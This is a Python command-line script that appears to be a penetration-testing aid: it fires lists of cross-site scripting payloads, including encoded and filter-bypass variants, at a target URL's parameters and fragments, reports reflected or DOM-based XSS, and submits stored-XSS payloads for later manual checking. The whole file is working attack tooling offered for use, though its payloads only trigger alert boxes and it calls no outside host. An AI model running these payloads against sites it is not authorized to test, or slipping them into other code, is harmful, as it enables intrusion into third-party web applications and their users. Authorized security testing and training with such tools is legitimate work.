#!/usr/bin/env python3
"""
XSS (Cross-Site Scripting) Quick Tester
Tests for XSS vulnerabilities with various payloads
"""

import requests
import argparse
from urllib.parse import quote, urlencode

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'

# XSS test payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "'>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "javascript:alert(1)",
    "<img src=x onerror=confirm(1)>",
    "<svg><script>alert(1)</script>",
]

# Encoded payloads
ENCODED_PAYLOADS = [
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
]

# Filter bypass payloads
BYPASS_PAYLOADS = [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script>alert(1)<!--",
    "<img src=x onerror=&#97;lert(1)>",
    "<<SCRIPT>alert(1)//<<SCRIPT>",
    "<BODY ONLOAD=alert(1)>",
]

def print_banner():
    banner = """
╔═══════════════════════════════════════╗
║      XSS Vulnerability Tester         ║
║           OSWA Edition                ║
╚═══════════════════════════════════════╝
    """
    print(Colors.BLUE + banner + Colors.END)

def test_reflected_xss(url, param, headers=None, method='GET'):
    """Test for reflected XSS"""
    print(f"\n{Colors.BLUE}[*] Testing Reflected XSS{Colors.END}")

    if headers is None:
        headers = {}

    vulnerabilities = []
    all_payloads = XSS_PAYLOADS + ENCODED_PAYLOADS + BYPASS_PAYLOADS

    for payload in all_payloads:
        if method.upper() == 'GET':
            # Build URL with payload
            if '?' in url:
                test_url = f"{url}&{param}={quote(payload)}"
            else:
                test_url = f"{url}?{param}={quote(payload)}"

            try:
                response = requests.get(test_url, headers=headers, timeout=10)

                # Check if payload is reflected in response
                if payload in response.text or payload.replace('"', '&quot;') in response.text:
                    # Check if in dangerous context (not encoded)
                    if '<script>' in response.text.lower() or 'onerror=' in response.text.lower() or 'onload=' in response.text.lower():
                        print(f"{Colors.GREEN}[+] VULNERABLE!{Colors.END}")
                        print(f"    Payload: {payload[:50]}")
                        print(f"    Context: HTML")
                        vulnerabilities.append(('reflected', payload, test_url))
                    else:
                        print(f"{Colors.YELLOW}[?] Reflected but possibly encoded:{Colors.END} {payload[:50]}")
                else:
                    print(f"[-] Not reflected: {payload[:50]}")

            except requests.exceptions.RequestException as e:
                print(f"{Colors.RED}[!] Error:{Colors.END} {e}")

        elif method.upper() == 'POST':
            data = {param: payload}

            try:
                response = requests.post(url, data=data, headers=headers, timeout=10)

                if payload in response.text:
                    if '<script>' in response.text.lower() or 'onerror=' in response.text.lower():
                        print(f"{Colors.GREEN}[+] VULNERABLE! (POST){Colors.END}")
                        print(f"    Payload: {payload[:50]}")
                        vulnerabilities.append(('reflected-post', payload, url))
                    else:
                        print(f"{Colors.YELLOW}[?] Reflected but possibly encoded (POST):{Colors.END} {payload[:50]}")

            except requests.exceptions.RequestException as e:
                print(f"{Colors.RED}[!] Error:{Colors.END} {e}")

    return vulnerabilities

def test_dom_xss(url, headers=None):
    """Test for DOM-based XSS"""
    print(f"\n{Colors.BLUE}[*] Testing DOM-Based XSS{Colors.END}")
    print(f"{Colors.YELLOW}[*] Note: This is a basic test. Manual inspection recommended.{Colors.END}")

    dom_payloads = [
        "#<img src=x onerror=alert(1)>",
        "#<script>alert(1)</script>",
        "#'-alert(1)-'",
    ]

    vulnerabilities = []

    for payload in dom_payloads:
        test_url = url + payload

        try:
            response = requests.get(test_url, headers=headers, timeout=10)

            # Check for dangerous JavaScript patterns
            dangerous_patterns = [
                'document.write(',
                'innerHTML =',
                '.html(',
                'eval(',
                'location.hash',
                'window.location',
            ]

            # Get the page content
            if any(pattern in response.text for pattern in dangerous_patterns):
                print(f"{Colors.YELLOW}[?] POSSIBLE DOM XSS{Colors.END}")
                print(f"    URL: {test_url}")
                print(f"    Found dangerous JavaScript patterns")
                print(f"    Manual verification required")
                vulnerabilities.append(('dom-possible', payload, test_url))

        except requests.exceptions.RequestException as e:
            print(f"{Colors.RED}[!] Error:{Colors.END} {e}")

    return vulnerabilities

def test_stored_xss(url, param, headers=None):
    """Test for stored XSS (requires manual verification)"""
    print(f"\n{Colors.BLUE}[*] Testing Stored XSS{Colors.END}")
    print(f"{Colors.YELLOW}[*] Note: Payloads submitted. Manual verification required.{Colors.END}")

    # Unique identifier for tracking
    import time
    unique_id = str(int(time.time()))

    payloads_submitted = []

    for i, payload in enumerate(XSS_PAYLOADS[:5], 1):  # Test first 5 payloads
        # Add unique identifier to payload
        unique_payload = payload.replace('alert(1)', f'alert("{unique_id}-{i}")')

        data = {param: unique_payload}

        try:
            response = requests.post(url, data=data, headers=headers, timeout=10)

            print(f"[*] Submitted payload {i}: {unique_payload[:40]}...")
            payloads_submitted.append(unique_payload)

        except requests.exceptions.RequestException as e:
            print(f"{Colors.RED}[!] Error:{Colors.END} {e}")

    print(f"\n{Colors.YELLOW}[*] Manual Verification Steps:{Colors.END}")
    print(f"    1. Navigate to pages where submitted data is displayed")
    print(f"    2. Look for alert boxes with identifier: {unique_id}")
    print(f"    3. Check browser console for JavaScript errors")
    print(f"    4. Inspect page source for unencoded payloads")

    return payloads_submitted

def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description='XSS Vulnerability Tester',
        epilog='Example: python3 xss_tester.py -u https://example.com/search -p q'
    )
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--param', help='Parameter to test (for reflected XSS)')
    parser.add_argument('-H', '--header', action='append', help='Custom headers')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='HTTP method')
    parser.add_argument('--dom-only', action='store_true', help='Test DOM XSS only')
    parser.add_argument('--stored-only', action='store_true', help='Test stored XSS only')

    args = parser.parse_args()

    # Build headers
    headers = {}
    if args.header:
        for header in args.header:
            if ':' in header:
                name, value = header.split(':', 1)
                headers[name.strip()] = value.strip()

    print(f"\n[*] Target: {args.url}")
    if args.param:
        print(f"[*] Parameter: {args.param}")
    print(f"[*] Method: {args.method}")

    all_vulns = []

    # Run tests
    if args.dom_only:
        all_vulns.extend(test_dom_xss(args.url, headers))
    elif args.stored_only:
        if not args.param:
            print(f"{Colors.RED}[!] Parameter required for stored XSS testing{Colors.END}")
            return
        test_stored_xss(args.url, args.param, headers)
    else:
        if args.param:
            all_vulns.extend(test_reflected_xss(args.url, args.param, headers, args.method))
        all_vulns.extend(test_dom_xss(args.url, headers))

    # Summary
    print(f"\n{Colors.BLUE}{'='*60}{Colors.END}")
    print(f"{Colors.BLUE}Summary:{Colors.END}")

    if all_vulns:
        print(f"{Colors.RED}[!] XSS vulnerabilities found: {len(all_vulns)}{Colors.END}")
        for vuln_type, payload, *details in all_vulns:
            print(f"    - Type: {vuln_type}")
            print(f"      Payload: {payload[:50]}")
        print(f"\n{Colors.YELLOW}[!] Recommendation: Verify manually and test for impact{Colors.END}")
    else:
        print(f"{Colors.GREEN}[+] No XSS vulnerabilities detected in automated tests{Colors.END}")
        print(f"{Colors.YELLOW}[*] Consider manual testing for complex scenarios{Colors.END}")

    print(f"{Colors.BLUE}{'='*60}{Colors.END}\n")

if __name__ == '__main__':
    main()
